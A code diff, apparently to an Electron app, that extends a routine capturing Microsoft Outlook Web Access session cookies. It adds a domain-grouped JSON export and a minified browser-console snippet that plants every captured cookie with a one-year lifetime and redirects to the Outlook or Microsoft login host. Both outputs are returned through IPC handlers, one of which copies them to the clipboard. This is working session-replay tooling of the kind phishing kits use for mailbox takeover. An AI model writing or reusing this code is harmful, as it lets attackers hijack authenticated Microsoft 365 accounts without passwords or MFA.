@@ -422,8 +422,51 @@ type CapturedOwaCookieSnapshot = {
   strongCount: number;
   netscape: string;
   header: string;
+  domainJson: string;
+  browserSnippet: string;
   quality: 'strong' | 'weak';
 };
+
+function cookiesToDomainJson(cookies: ParsedCookie[]): string {
+  const grouped: Record<string, Record<string, Record<string, unknown>>> = {};
+  for (const cookie of cookies) {
+    const domain = String(cookie.domain || '').trim();
+    const name = String(cookie.name || '').trim();
+    if (!domain || !name) continue;
+    grouped[domain] ||= {};
+    grouped[domain][name] = {
+      Name: name,
+      Value: cookie.value,
+      Path: cookie.path || '/',
+      HttpOnly: true,
+    };
+  }
+  return JSON.stringify(grouped, null, 2);
+}
+
+function cookiesToBrowserConsoleSnippet(cookies: ParsedCookie[]): string {
+  const serializable = cookies.map((cookie) => ({
+    name: cookie.name,
+    value: cookie.value,
+    domain: cookie.domain,
+    expirationDate: cookie.expirationDate
+      ? Math.floor(cookie.expirationDate * 1000)
+      : undefined,
+    hostOnly: cookie.domain ? !cookie.domain.startsWith('.') : true,
+    httpOnly: true,
+    path: cookie.path || '/',
+    sameSite: 'none',
+    secure: cookie.secure !== false,
+    session: !cookie.expirationDate,
+    storeId: null,
+  }));
+  const primaryOrigin =
+    serializable.find((cookie) => typeof cookie.domain === 'string' && String(cookie.domain).includes('outlook'))
+      ?.domain || '.login.microsoftonline.com';
+  const host = String(primaryOrigin).replace(/^\./, '');
+  const payload = JSON.stringify(serializable);
+  return `!function(){let e=JSON.parse(${JSON.stringify(payload)});\nfor(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}Secure;SameSite=None\`;\nwindow.location.href=${JSON.stringify(`https://${host}`)};}();`;
+}
 
 async function captureTokenBackedOwaCookies(accountId: string): Promise<CapturedOwaCookieSnapshot> {
   const store = await readStore();
@@ -535,6 +578,8 @@ async function captureTokenBackedOwaCookies(accountId: string): Promise<Captured
     strongCount,
     netscape: cookiesToNetscape(msCookies),
     header: cookiesToHeaderString(msCookies),
+    domainJson: cookiesToDomainJson(msCookies),
+    browserSnippet: cookiesToBrowserConsoleSnippet(msCookies),
     quality: strongCount > 0 ? 'strong' : 'weak',
   };
 }
@@ -3067,6 +3112,8 @@ function setupIpcHandlers() {
         email: snapshot.account.email,
         netscape: snapshot.netscape,
         header: snapshot.header,
+        domainJson: snapshot.domainJson,
+        browserSnippet: snapshot.browserSnippet,
         quality: snapshot.quality,
       };
     } catch (error: any) {
@@ -3109,6 +3156,8 @@ function setupIpcHandlers() {
         email: snapshot.account.email,
         netscape: snapshot.netscape,
         header: snapshot.header,
+        domainJson: snapshot.domainJson,
+        browserSnippet: snapshot.browserSnippet,
         quality: snapshot.quality,
         copiedToClipboard: true,
       };
